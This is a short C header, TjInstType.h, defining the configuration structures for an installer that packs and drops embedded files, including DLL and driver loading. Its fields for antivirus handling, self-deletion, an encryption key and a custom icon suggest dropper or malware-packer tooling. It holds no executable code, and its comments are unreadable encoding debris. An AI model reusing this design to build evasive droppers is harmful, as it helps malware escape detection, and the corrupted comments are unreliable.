/****************************************************************
 * Module:
 *      TjInstType.h
 *
 * Author:
 *		XieBo(secman_xie@hotmail.com)
 *
 * Note:
 *		���ɰ�װ����ʱ�õ������ݽṹ
 *
 *      1.���ɵ������ļ���ʽ
 *
 *        TJ_INSTALLER_CTL TJ_INST_FILE_CTL TJ_INST_FILE_CTL TJ_INST_FILE_CTL(dwNextEntryOffset=0����)
 *
 *      2.���ɹ���
 *        ���������ļ��󣬽������ļ���Ϊ���������ҵĴ������
 *        �������.exe <�����ļ�>
 */
#ifndef _TJ_INST_TYPE_H_
#define _TJ_INST_TYPE_H_

#define TJ_INST_MAGIC         0x54756F4A // TuoJ

#define TJ_INST_FILE_TYPE_0   0          // 0 - д��
#define TJ_INST_FILE_TYPE_1   1          // 1 - д�벢��DLL����
#define TJ_INST_FILE_TYPE_2   2          // 2 - д�벢��SYS���أ�TO_DO��δ��֧�֣�
#define TJ_INST_FILE_TYPE_3   3          // 3 - д�룬�����ļ�������ʱ��ϵͳ���Ի�


// ������Ҫ������ļ�������������ļ���ȫ·������������������ͬһ��Ŀ¼�����ɴ������ȡ
// �������ṩdwNextEntryOffset��dwFileType��wzLocalName��wzTargetName
//
typedef struct _TJ_INST_FILE_CTL
{
	DWORD     dwNextEntryOffset;         // ��һ���ṹ��ƫ�Ƶ�ַ��sizeof(TJ_INST_FILE_CTL)����Ϊ0��ʾ��ǰ�����һ��

	DWORD     dwFileType;                // �ļ����ͣ�����TJ_INST_FILE_TYPE_X

	DWORD     dwFileLength;              // ��Ҫ������ļ����ݳ���

	DWORD     dwFileOffset;              // ��Ҫ������ļ�����ƫ����

	wchar_t   wzLocalName[MAX_PATH];     // ��Ҫ����ı����ļ�����ȫ·����������������ͬһ��Ŀ¼

	wchar_t   wzTargetName[MAX_PATH];    // �ļ���Ŀ����ͷ��ļ���������ÿ���ͻ���ͬ��

}  TJ_INST_FILE_CTL,
*LPTJ_INST_FILE_CTL;


// ���ڰ�װ�����ȫ�ֿ���
//
typedef struct _TJ_INSTALLER_CTL
{
    DWORD     dwMagicNumber;             // ħ����

	DWORD     dwAntiVirMask;             // ��֧�ֵ�ɱ�����������AdkAntiVirus.h�ж����ɱ�����ֵ

	BOOL      bDelSelf;                  // �Ƿ���ɾ��

	CHAR      szEncryptKey[MAX_PATH];    // �����õ���Կ�������û����ƻ�������ÿ��ƣ����Ȳ�С��16��

	WCHAR     wzIconFile[MAX_PATH];      // ͼ���ļ�

}  TJ_INSTALLER_CTL,
*LPTJ_INSTALLER_CTL;


#endif  // _TJ_INSTALLER_TYPE_H_